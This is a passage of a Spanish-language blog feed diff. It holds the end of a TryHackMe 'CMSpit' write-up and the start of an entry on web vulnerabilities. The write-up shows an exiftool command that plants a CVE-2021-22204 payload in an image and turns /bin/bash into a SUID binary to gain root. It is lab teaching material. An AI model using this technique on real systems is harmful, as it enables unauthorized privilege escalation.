+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/stux04.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;configfile&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/stux05.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora solo le pasamos el payload a nuestra imagen y cuando se ejecute con exiftool ejecutaremos el comando que le indicamos en nuestro payload&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kali㉿Hacknet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/…/tryhackme/maquinas/CMSpit/exploit]
+Sie7e&amp;gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool &lt;span class=&quot;nt&quot;&gt;-config&lt;/span&gt; configfile &lt;span class=&quot;s1&quot;&gt;'-HasselbladExif&amp;lt;=exploit.djvu'&lt;/span&gt; image.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Subimos nuestra imagen con al maquina victima, hay muchas maneras de como subirlo (pyhton, ncat).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/stux06.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La bash &lt;strong&gt;no es SUID&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/stux07.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos exiftool ccon nuestra imagen, y deberia de haber cambiado los permisos de la &lt;strong&gt;/bin/bash&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/stux08.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La &lt;strong&gt;/bin/bash&lt;/strong&gt; ahora es SUID&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/stux09.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;user-root&quot;&gt;USER ROOT&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/CMSpit/root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>B0Y-SIE7E</name></author><category term="tryhackme" /><category term="linux" /><category term="write up" /><category term="xxe" /><category term="medium" /><summary type="html">Maquina de nivel media, creada por stuxnet. En la que se explotan vulnerabilidades como CVE-2020-35847, CVE-2020-35848 en la versión de un Cockpit CMS 0.11.1 y CVE-2021-22204 que tiene la herramienta de exiftool en la que se aprovecha para realizar ejecución de comandos y poder ganar privilegios a nivel de usuario</summary></entry><entry><title type="html">Vulnerabilidades Web</title><link href="http://localhost:4000/Vulnerabilidades-web/" rel="alternate" type="text/html" title="Vulnerabilidades Web" /><published>2022-02-26T00:00:00-05:00</published><updated>2022-02-26T00:00:00-05:00</updated><id>http://localhost:4000/Vulnerabilidades-web</id><content type="html" xml:base="http://localhost:4000/Vulnerabilidades-web/">&lt;p&gt;Conceptos básicos y a grandes rasgos de las vulnerabilidades asi como recursos de como explotarlas cada uno de estas&lt;/p&gt;
 
 &lt;table&gt;
   &lt;tbody&gt;
